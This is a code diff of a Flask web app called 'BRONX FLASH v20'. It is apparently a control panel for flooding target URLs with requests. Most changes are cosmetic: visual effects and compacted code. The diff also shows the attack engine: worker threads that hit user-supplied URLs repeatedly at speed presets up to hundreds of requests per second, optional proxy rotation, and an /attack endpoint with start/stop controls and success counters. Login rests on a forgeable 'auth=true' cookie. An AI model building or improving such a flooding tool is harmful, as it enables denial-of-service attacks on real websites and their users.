@@ -37,10 +37,8 @@ def get_session():
 
 SPEEDS = {"slow":{"rate":2,"delay":0.2,"workers":2},"fast":{"rate":5,"delay":0.15,"workers":5},"veryfast":{"rate":10,"delay":0.1,"workers":10},"ultra":{"rate":50,"delay":0.05,"workers":25},"lightning":{"rate":100,"delay":0.02,"workers":50},"flash":{"rate":500,"delay":0.001,"workers":100}}
 
-# ============================================
-# v20 - EFFECTS
-# ============================================
 EFFECTS = ["snow","matrix","particles","neon","firefly","glitch","pulse","scanlines","bubbles","stars"]
+current_effect = "snow"
 
 LOGIN = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v20</title>
 <style>
@@ -52,8 +50,7 @@ body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;backg
 .box{background:rgba(5,0,10,0.97);padding:50px;border-radius:24px;border:1px solid rgba(255,0,85,0.2);width:420px;text-align:center;z-index:1;box-shadow:0 0 100px rgba(255,0,85,0.15),0 0 200px rgba(0,200,255,0.05);animation:pulseBox 3s infinite}
 @keyframes pulseBox{50%{box-shadow:0 0 150px rgba(255,0,85,0.3),0 0 250px rgba(0,200,255,0.1)}}
 .logo{font-size:4em;animation:glow 2s infinite}@keyframes glow{50%{filter:drop-shadow(0 0 30px rgba(255,0,85,0.8))}}
-h1{font-size:2em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px;animation:textShine 3s infinite}
-@keyframes textShine{50%{filter:brightness(1.3)}}
+h1{font-size:2em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
 .tag{color:#666;font-size:0.7em;letter-spacing:5px;text-transform:uppercase;margin:10px 0}
 input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;margin:10px 0;font-size:15px;transition:0.3s}
 input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2);outline:none}
@@ -61,6 +58,9 @@ input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2);outline:
 .btn:hover{box-shadow:0 0 60px rgba(255,0,85,0.7);transform:translateY(-3px)}.btn:active{transform:scale(0.95)}
 .btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.2),transparent);animation:btnShine 2s infinite}
 @keyframes btnShine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
+@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}
+@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-30px)scale(1.5)}}
+@keyframes pulseNeon{50%{opacity:0.6}}@keyframes twinkle{50%{opacity:0.2}}
 </style></head><body>
 <div class="effect-layer" id="effects"></div>
 <div class="box">
@@ -76,18 +76,27 @@ input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2);outline:
 {% if error %}<p style="color:#ff0055;margin-top:10px">{{ error }}</p>{% endif %}
 </div>
 <script>
-let effect='{{ effect }}';
-let el=document.getElementById('effects');
-function createSnow(){let d=document.createElement('div');d.style.cssText='position:absolute;color:#ff0055;font-size:'+(Math.random()*10+8)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*5+3+'s linear infinite;pointer-events:none';d.innerHTML='❄️';el.appendChild(d)}
-function createMatrix(){let d=document.createElement('div');d.style.cssText='position:absolute;color:#00ff88;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*3+2+'s linear infinite;pointer-events:none';d.innerHTML=String.fromCharCode(0x30A0+Math.random()*96);el.appendChild(d)}
-function createParticle(){let d=document.createElement('div');d.style.cssText='position:absolute;width:'+(Math.random()*3+1)+'px;height:'+(Math.random()*3+1)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+Math.random()*4+3+'s ease-in-out infinite;border-radius:50%;pointer-events:none';el.appendChild(d)}
-if(effect==='snow')for(let i=0;i<40;i++)createSnow();
-if(effect==='matrix')for(let i=0;i<50;i++)createMatrix();
-if(effect==='particles')for(let i=0;i<30;i++)createParticle();
-if(effect==='neon'){el.style.background='radial-gradient(circle,rgba(255,0,85,0.05),transparent)';el.style.animation='pulseNeon 2s infinite'}
-if(effect==='stars')for(let i=0;i<20;i++){let s=document.createElement('div');s.style.cssText='position:absolute;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+Math.random()*2+1+'s infinite;pointer-events:none';el.appendChild(s)}
+(function(){
+var e='{{ effect }}';var el=document.getElementById('effects');
+function cS(){var d=document.createElement('div');d.style.cssText='position:absolute;color:#ff0055;font-size:'+(Math.random()*10+8)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*5+3+'s linear infinite;pointer-events:none';d.innerHTML='❄️';el.appendChild(d)}
+function cM(){var d=document.createElement('div');d.style.cssText='position:absolute;color:#00ff88;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*3+2+'s linear infinite;pointer-events:none';d.innerHTML=String.fromCharCode(0x30A0+Math.random()*96);el.appendChild(d)}
+function cP(){var d=document.createElement('div');d.style.cssText='position:absolute;width:'+(Math.random()*3+1)+'px;height:'+(Math.random()*3+1)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+Math.random()*4+3+'s ease-in-out infinite;border-radius:50%;pointer-events:none';el.appendChild(d)}
+function cSt(){var d=document.createElement('div');d.style.cssText='position:absolute;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+Math.random()*2+1+'s infinite;pointer-events:none';el.appendChild(d)}
+function cB(){var d=document.createElement('div');d.style.cssText='position:absolute;width:'+(Math.random()*20+10)+'px;height:'+(Math.random()*20+10)+'px;border:1px solid rgba(255,0,85,0.3);left:'+Math.random()*100+'%;border-radius:50%;animation:float '+Math.random()*5+4+'s ease-in-out infinite;pointer-events:none';el.appendChild(d)}
+function cF(){var d=document.createElement('div');d.style.cssText='position:absolute;width:4px;height:4px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;border-radius:50%;box-shadow:0 0 10px #ffd700;animation:fly '+Math.random()*3+2+'s ease-in-out infinite;pointer-events:none';el.appendChild(d)}
+if(e==='snow')for(var i=0;i<40;i++)cS();
+if(e==='matrix')for(var i=0;i<50;i++)cM();
+if(e==='particles')for(var i=0;i<30;i++)cP();
+if(e==='neon'){el.style.background='radial-gradient(circle,rgba(255,0,85,0.05),transparent)';el.style.animation='pulseNeon 2s infinite'}
+if(e==='stars')for(var i=0;i<20;i++)cSt();
+if(e==='bubbles')for(var i=0;i<15;i++)cB();
+if(e==='firefly')for(var i=0;i<15;i++)cF();
+if(e==='pulse'){el.style.background='rgba(255,0,85,0.03)';el.style.animation='pulseNeon 1s infinite'}
+if(e==='glitch'){setInterval(function(){el.style.transform='translate('+(Math.random()*4-2)+'px,'+(Math.random()*4-2)+'px)'},100)}
+if(e==='scanlines'){el.style.background='repeating-linear-gradient(0deg,rgba(0,0,0,0.1) 0px,rgba(0,0,0,0.1) 2px,transparent 2px,transparent 4px)'}
+})();
 </script>
-<style>@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-30px)scale(1.5)}}@keyframes pulseNeon{50%{opacity:0.6}}@keyframes twinkle{50%{opacity:0.2}}</style>
+<style>@keyframes fly{0%,100%{transform:translate(0,0)}25%{transform:translate(100px,-50px)}50%{transform:translate(-50px,-100px)}75%{transform:translate(-100px,50px)}}</style>
 </body></html>"""
 
 DASH = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v20</title>
@@ -114,13 +123,11 @@ label{font-size:0.6em;text-transform:uppercase;letter-spacing:2px;color:#555;dis
 @keyframes shine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
 .btn-secondary{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.1)}.btn-secondary:hover{box-shadow:0 0 20px rgba(255,255,255,0.1);color:#fff}
 .btn-danger{background:rgba(255,0,0,0.15);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-danger:hover{box-shadow:0 0 25px rgba(255,0,0,0.3)}
-.btn-reset{background:rgba(255,215,0,0.15);color:#ffd700;border:1px solid rgba(255,215,0,0.2)}.btn-reset:hover{box-shadow:0 0 25px rgba(255,215,0,0.3)}
-.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
 .logs{background:rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);border-radius:10px;padding:15px;max-height:250px;overflow:auto;font-size:0.7em;font-family:'SF Mono',monospace;color:#00ff88}
 .log-e{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);color:#888}
 .badge{display:inline-block;padding:5px 14px;border-radius:20px;font-size:0.6em;letter-spacing:2px;text-transform:uppercase}
 .badge-active{background:rgba(255,0,85,0.15);color:#ff0055;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.4}}
-.badge-on{background:rgba(0,255,136,0.15);color:#00ff88}
 .toggle-row{display:flex;align-items:center;gap:12px;margin:10px 0}
 .toggle{width:44px;height:24px;background:rgba(255,255,255,0.08);border-radius:12px;cursor:pointer;position:relative;transition:0.3s}
 .toggle.on{background:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.4)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:22px}
@@ -128,6 +135,10 @@ label{font-size:0.6em;text-transform:uppercase;letter-spacing:2px;color:#555;dis
 .effect-select{display:flex;flex-wrap:wrap;gap:5px;margin:5px 0}
 .effect-opt{padding:6px 12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:20px;color:#666;font-size:0.6em;cursor:pointer;transition:0.2s;letter-spacing:1px}
 .effect-opt:hover,.effect-opt.active{border-color:#ff0055;color:#ff0055;background:rgba(255,0,85,0.1)}
+@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}
+@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-30px)scale(1.5)}}
+@keyframes twinkle{50%{opacity:0.2}}
+@keyframes fly{0%,100%{transform:translate(0,0)}25%{transform:translate(100px,-50px)}50%{transform:translate(-50px,-100px)}75%{transform:translate(-100px,50px)}}
 </style></head><body>
 <div class="container">
 <div class="header">
@@ -209,16 +220,29 @@ function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').c
 function toggleRate(){rateOn=!rateOn;document.getElementById('rateToggle').classList.toggle('on',rateOn);document.getElementById('rateLabel').textContent=rateOn?'ON':'OFF'}
 function saveRate(){let rpm=document.getElementById('rpm').value;fetch('/rate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:rateOn,rpm:parseInt(rpm)})})}
 function saveProxies(){let p=document.getElementById('customProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json())}
-function setEffect(e){fetch('/effect/'+e).then(()=>{document.querySelectorAll('.effect-opt').forEach(el=>el.classList.remove('active'));event.target.classList.add('active')})}
-function resetStats(){fetch('/reset',{method:'POST'}).then(()=>{u()})}
-function copyIP(){let ip=document.getElementById('browserIP').textContent;navigator.clipboard.writeText(ip)}
-function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total;document.getElementById('ltSuccess').textContent=d.lt_success;document.getElementById('ltTotal').textContent=d.lt_total})}
-function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>`<div class="log-e">${x}</div>`).join('')})}
-function start(){let urls=document.getElementById('urls').value.split('\\n').filter(u=>u.trim());let count=document.getElementById('count').value;let speed=document.getElementById('speed').value;let mode=document.getElementById('mode').value;if(urls.length==0)return;fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls,count:parseInt(count),speed,mode,proxy:proxyOn})}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span class="badge badge-active">ACTIVE</span>';l();u()})}
-function stop(){fetch('/stop',{method:'POST'}).then(()=>{document.getElementById('status').innerHTML='<span style="color:#666">Terminated</span>';l()})}
-fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{document.getElementById('browserIP').textContent=d.ip})
-setInterval(()=>{l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1500)
-</script></body></html>"""
+function setEffect(e){fetch('/effect/'+e).then(function(){document.querySelectorAll('.effect-opt').forEach(function(el){el.classList.remove('active')});event.target.classList.add('active');applyFx(e)})}
+function applyFx(e){var b=document.body;document.querySelectorAll('.fx').forEach(function(el){el.remove()});b.style.animation='';b.style.boxShadow='';
+if(e==='snow'){for(var i=0;i<30;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;color:#ff0055;font-size:'+(Math.random()*10+8)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*5+3+'s linear infinite;pointer-events:none;z-index:0;opacity:0.5';d.innerHTML='❄️';b.appendChild(d)}}
+if(e==='matrix'){for(var i=0;i<40;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;color:#00ff88;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*3+2+'s linear infinite;pointer-events:none;z-index:0;opacity:0.6';d.innerHTML=String.fromCharCode(0x30A0+Math.random()*96);b.appendChild(d)}}
+if(e==='particles'){for(var i=0;i<25;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:'+(Math.random()*4+2)+'px;height:'+(Math.random()*4+2)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+Math.random()*4+3+'s ease-in-out infinite;border-radius:50%;pointer-events:none;z-index:0';b.appendChild(d)}}
+if(e==='stars'){for(var i=0;i<30;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+Math.random()*2+1+'s infinite;pointer-events:none;z-index:0';b.appendChild(d)}}
+if(e==='bubbles'){for(var i=0;i<15;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:'+(Math.random()*20+10)+'px;height:'+(Math.random()*20+10)+'px;border:1px solid rgba(255,0,85,0.3);left:'+Math.random()*100+'%;border-radius:50%;animation:float '+Math.random()*5+4+'s ease-in-out infinite;pointer-events:none;z-index:0';b.appendChild(d)}}
+if(e==='firefly'){for(var i=0;i<15;i++){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;width:4px;height:4px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;border-radius:50%;box-shadow:0 0 10px #ffd700;animation:fly '+Math.random()*3+2+'s ease-in-out infinite;pointer-events:none;z-index:0';b.appendChild(d)}}
+if(e==='pulse'){b.style.animation='pulseBg 2s infinite'}if(e==='glitch'){b.style.animation='glitchBg 0.3s infinite'}
+if(e==='neon'){b.style.boxShadow='inset 0 0 150px rgba(255,0,85,0.1)'}
+if(e==='scanlines'){var d=document.createElement('div');d.className='fx';d.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.08) 0px,rgba(0,0,0,0.08) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:999';b.appendChild(d)}
+}
+function resetStats(){fetch('/reset',{method:'POST'}).then(function(){u()})}
+function copyIP(){var ip=document.getElementById('browserIP').textContent;navigator.clipboard.writeText(ip)}
+function u(){fetch('/stats').then(function(r){return r.json()}).then(function(d){document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total;document.getElementById('ltSuccess').textContent=d.lt_success;document.getElementById('ltTotal').textContent=d.lt_total})}
+function l(){fetch('/logs').then(function(r){return r.json()}).then(function(d){document.getElementById('logs').innerHTML=d.logs.map(function(x){return'<div class="log-e">'+x+'</div>'}).join('')})}
+function start(){var urls=document.getElementById('urls').value.split('\\n').filter(function(u){return u.trim()});var count=document.getElementById('count').value;var speed=document.getElementById('speed').value;var mode=document.getElementById('mode').value;if(urls.length==0)return;fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls:urls,count:parseInt(count),speed:speed,mode:mode,proxy:proxyOn})}).then(function(r){return r.json()}).then(function(d){document.getElementById('status').innerHTML='<span class="badge badge-active">ACTIVE</span>';l();u()})}
+function stop(){fetch('/stop',{method:'POST'}).then(function(){document.getElementById('status').innerHTML='<span style="color:#666">Terminated</span>';l()})}
+fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){document.getElementById('browserIP').textContent=d.ip})
+setInterval(function(){l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1500)
+</script>
+<style>@keyframes pulseBg{50%{background:rgba(255,0,85,0.02)}}@keyframes glitchBg{0%,100%{transform:translate(0)}20%{transform:translate(-3px,3px)}40%{transform:translate(3px,-3px)}60%{transform:translate(-1px,1px)}80%{transform:translate(1px,-1px)}}</style>
+</body></html>"""
 
 # ============================================
 # ATTACK ENGINE
@@ -231,28 +255,14 @@ def send_direct(url, session):
 
 def attack_worker(attack_id, url, count, delay, mode, use_proxy):
     session = get_session()
-    all_proxies = custom_proxies + SOCKS5_PROXIES
-    
     for i in range(count):
         if attack_id not in active_attacks: break
-        
-        # Rate limiter check
-        if rate_limit_config["enabled"]:
-            rpm = rate_limit_config["rpm"]
-            time.sleep(60 / rpm)
-        
+        if rate_limit_config["enabled"]: time.sleep(60 / rate_limit_config["rpm"])
         success = send_direct(url, session)
-        
         with threading.Lock():
-            if success:
-                attack_stats["success"] += 1
-                total_lifetime["success"] += 1
-            else:
-                attack_stats["failed"] += 1
-                total_lifetime["failed"] += 1
-            attack_stats["total"] += 1
-            total_lifetime["total"] += 1
-        
+            if success: attack_stats["success"] += 1; total_lifetime["success"] += 1
+            else: attack_stats["failed"] += 1; total_lifetime["failed"] += 1
+            attack_stats["total"] += 1; total_lifetime["total"] += 1
         if delay > 0: time.sleep(delay)
 
 def run_attack(attack_id, urls, count, speed, mode, use_proxy):
@@ -267,28 +277,24 @@ def run_attack(attack_id, urls, count, speed, mode, use_proxy):
 # ============================================
 # ROUTES
 # ============================================
-current_effect = "snow"
-
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
-            resp = make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
-            return resp
+            return make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
         return render_template_string(LOGIN, error="Access Denied", effect=current_effect)
     return render_template_string(LOGIN, error=None, effect=current_effect)
 
 @app.route('/dashboard')
 def dashboard():
     if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
-    return render_template_string(DASH, effects=EFFECTS)
+    return render_template_string(DASH, effects=EFFECTS, effect=current_effect)
 
 @app.route('/effect/<effect>')
 def set_effect(effect):
     global current_effect
-    if effect in EFFECTS:
-        current_effect = effect
-    return jsonify({"status": "ok"})
+    if effect in EFFECTS: current_effect = effect
+    return jsonify({"status":"ok"})
 
 @app.route('/attack', methods=['POST'])
 def attack():
@@ -314,16 +320,14 @@ def stop():
 
 @app.route('/reset', methods=['POST'])
 def reset():
-    attack_stats["success"] = 0
-    attack_stats["failed"] = 0
-    attack_stats["total"] = 0
+    attack_stats["success"] = attack_stats["failed"] = attack_stats["total"] = 0
     return jsonify({"status":"reset"})
 
 @app.route('/rate', methods=['POST'])
 def save_rate():
     global rate_limit_config
     d = request.get_json()
-    rate_limit_config = {"enabled": d.get('enabled',False), "rpm": d.get('rpm',15)}
+    rate_limit_config = {"enabled":d.get('enabled',False),"rpm":d.get('rpm',15)}
     return jsonify({"status":"saved"})
 
 @app.route('/save_proxies', methods=['POST'])
@@ -337,7 +341,7 @@ def save_proxies():
 def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})
 
 @app.route('/stats')
-def stats(): return jsonify({**attack_stats, "lt_success": total_lifetime["success"], "lt_total": total_lifetime["total"]})
+def stats(): return jsonify({**attack_stats,"lt_success":total_lifetime["success"],"lt_total":total_lifetime["total"]})
 
 @app.route('/logout')
 def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'
